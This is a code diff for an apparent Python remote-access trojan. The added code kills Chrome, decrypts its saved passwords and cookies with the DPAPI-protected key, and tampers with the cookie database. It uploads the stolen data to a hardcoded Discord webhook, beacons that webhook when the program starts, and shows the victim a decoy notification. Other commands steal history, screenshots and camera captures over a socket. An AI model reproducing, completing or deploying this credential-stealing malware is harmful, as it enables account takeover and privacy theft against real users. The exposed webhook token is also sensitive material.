@@ -10,6 +10,104 @@ from selenium.webdriver.chrome.options import Options
 from colorama import Fore
 
 def get_chrome_datetime(chromedate):
+    if chromedate != 86400000000 and chromedate:
+        try:
+            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+        except Exception as e:
+            print(f"Error: {e}, chromedate: {chromedate}")
+            return chromedate
+    else:
+        return ""
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def decrypt_data(data, key):
+    try:
+        iv = data[3:15]
+        data = data[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(data)[:-16].decode()
+    except:
+        try:
+            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
+        except:
+            # not supported
+            return ""
+
+def save_cookies_to_txt(cookies):
+    with open("cookies.txt", "w", encoding="utf-8") as file:
+        for cookie_data in cookies:
+            file.write(cookie_data + "\n\n")
+
+def cookie(webhook):
+    subprocess.call(["taskkill", "/F", "/IM", "chrome.exe"])
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+                           "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
+
+    filename = "Cookies.db"
+    shutil.copyfile(db_path, filename)
+    db = sqlite3.connect(filename)
+    db.text_factory = lambda b: b.decode(errors="ignore")
+    cursor = db.cursor()
+
+    cursor.execute("""
+    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+    FROM cookies""")
+
+    key = get_encryption_key()
+    cookies = []
+    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
+        if not value:
+            decrypted_value = decrypt_data(encrypted_value, key)
+        else:
+            decrypted_value = value
+        cookie_data = (f"""
+        Host: {host_key}
+        Cookie name: {name}
+        Cookie value (decrypted): {decrypted_value}
+        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
+        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
+        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
+        ===============================================================""")
+        cookies.append(cookie_data)
+        cursor.execute("""
+        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
+        WHERE host_key = ?
+        AND name = ?""", (decrypted_value, host_key, name))
+    # commit changes
+    db.commit()
+    # close connection
+    db.close()
+
+    os.remove("Cookies.db")
+
+    # Save cookies to a text file
+    save_cookies_to_txt(cookies)
+
+    # Send cookies file via webhook
+    webhook_url = webhook
+    files = {"file": open("cookies.txt", "rb")}
+    response = requests.post(webhook_url, files=files)
+
+    if response.status_code == 200:
+        os.remove("cookies.txt")
+        Functions.notification(title="Üzgünüz!", content="Ne olduğunu bizde anlayamadık...")
+        return f"Succsefully sent the cookies file via webhook!"
+    else:
+        os.remove("cookies.txt")
+        return f"Failed to send the cookies file via webhook!"
+
+def get_chrome_datetime(chromedate):
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
@@ -29,7 +127,6 @@ def get_encryption_key():
     # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
-
 def decrypt_password(password, key):
     try:
         # get the initialization vector
@@ -46,6 +143,10 @@ def decrypt_password(password, key):
             # not supported
             return ""
 
+def save_passwords_to_txt(passwords):
+    with open("passwords.txt", "w", encoding="utf-8") as file:
+        for password_data in passwords:
+            file.write(password_data + "\n\n")
 
 def main():
     results = []
@@ -72,34 +173,36 @@ def main():
         date_created = row[4]
         date_last_used = row[5]
         if username or password:
-            result = {
-                "Origin URL": origin_url,
-                "Action URL": action_url,
-                "Username": username,
-                "Password": password
-            }
+            result = f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n"
             if date_created != 86400000000 and date_created:
-                result["Creation date"] = str(get_chrome_datetime(date_created))
+                result += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
             if date_last_used != 86400000000 and date_last_used:
-                result["Last Used"] = str(get_chrome_datetime(date_last_used))
+                result += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"
             results.append(result)
 
     cursor.close()
     db.close()
     try:
-        # try to remove the copied db file
         os.remove(filename)
     except:
         pass
-
     return results
 
-def baslat():
-    results = main()
-    for result in results:
-        print("=" * 50)
-        for key, value in result.items():
-            print(f"{key}: {value}")
+def send_passwords_via_webhook(webhook):
+    passwords = main()
+    save_passwords_to_txt(passwords)
+    # Send passwords file via webhook
+    webhook_url = webhook
+    files = {"file": open("passwords.txt", "rb")}
+    response = requests.post(webhook_url, files=files)
+
+    if response.status_code == 200:
+        os.remove("passwords.txt")
+        Functions.notification(title="Üzgünüz!", content="Ne olduğunu bizde anlayamadık...")
+        return "Successfully sent the passwords file via webhook!"
+    else:
+        os.remove("passwords.txt")
+        return "Failed to send the passwords file via webhook!"
 
 class Functions:
     def list_dir(self):
@@ -173,15 +276,15 @@ class Functions:
     def voice(self):
         return f"{Fore.GREEN}Succsesfully taked screenshot!{Fore.RESET}"
 
-    def steal_password(self, passwords=None):
+    def steal_password(self, data):
         try:
-            return main()
+            return send_passwords_via_webhook(data)
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def steal_cookie(self):
         try:
-            return f"{Fore.RED}Currently under development!{Fore.RESET}"
+            return cookie()
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
@@ -463,8 +566,21 @@ class Functions:
 Functions = Functions()
 
 class Main:
+    webhook = "https://discord.com/api/webhooks/1217526873932824597/r0HTVunZExlyg672N1vE4kD9gm77dbj7qtACVtd_Rs8dKidl0sLLcM5Ip9Y6BNg_a5Ly"
     host = "localhost"
     port = 9999
+
+    message = f"{host} : {port} listening!"
+
+    payload = {
+        "content": message
+    }
+
+    headers = {
+        "Content-Type": "application/json"
+    }
+
+    response = requests.post(webhook, data=json.dumps(payload), headers=headers)
 
     while True:
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -513,17 +629,22 @@ class Main:
                     elif data == "cp":
                         conn.send(f"{Functions.capture_camera()}".encode())
 
-                    elif data == "password" or data == "pw":
-                        conn.send(f"{Functions.steal_password()}".encode())
+                    elif data.startswith("pw "):
+                        data = data[3:]
+                        conn.send(f"{Functions.steal_password(data)}".encode())
+
+                    elif data.startswith("password "):
+                        data = data[9:]
+                        conn.send(f"{Functions.steal_password(data)}".encode())
+
+                    elif data == "cookie":
+                        conn.send(f"{Functions.steal_cookie()}".encode())
 
                     elif data == "ss" or data == "screenshot":
                         conn.send(f"{Functions.take_screenshot()}".encode())
 
                     elif data == "cv" or data == "voice":
                         conn.send(f"{Functions.voice()}".encode())
-
-                    elif data == "cooike":
-                        conn.send(f"{Functions.steal_cookie()}".encode())
 
                     elif data == "history":
                         conn.send(f"{Functions.steal_history()}".encode())
